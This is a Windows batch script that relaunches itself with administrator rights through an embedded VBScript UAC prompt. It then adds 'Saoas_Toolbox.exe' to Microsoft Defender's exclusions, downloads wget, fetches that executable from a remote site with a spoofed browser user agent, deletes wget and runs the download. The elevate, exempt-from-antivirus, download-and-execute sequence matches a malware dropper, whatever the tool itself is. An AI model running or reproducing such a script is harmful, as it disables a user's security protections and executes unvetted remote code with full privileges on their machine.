@echo off
<!-- : --- Self-elevating.bat ---------------------------------------
whoami /groups | find "S-1-16-12288" > nul && goto :ELEVATED
echo Requesting administrative privileges...
set "ELEVATE_CMDLINE=cd /d "%cd%" & call "%~f0" %*"
cscript //nologo "%~f0?.wsf" //job:Elevate & exit /b

-->
<job id="Elevate"><script language="VBScript">
  Set objShell = CreateObject("Shell.Application")
  Set objWshShell = WScript.CreateObject("WScript.Shell")
  Set objWshProcessEnv = objWshShell.Environment("PROCESS")
  strCommandLine = Trim(objWshProcessEnv("ELEVATE_CMDLINE"))
  objShell.ShellExecute "cmd", "/c " & strCommandLine, "", "runas"
</script></job>
:ELEVATED -----------------------------------------------------------

powershell -Command Add-MpPreference -ExclusionProcess "Saoas_Toolbox.exe" -Force
cd /d "%USERPROFILE%/Desktop/"
powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe" 
wget -q --show-progress --user-agent="chrome" --no-hsts "https://links.saoas.tv/Toolbox/Saoas_Toolbox.exe" -O Saoas_Toolbox.exe
del /f wget.exe 
Saoas_Toolbox.exe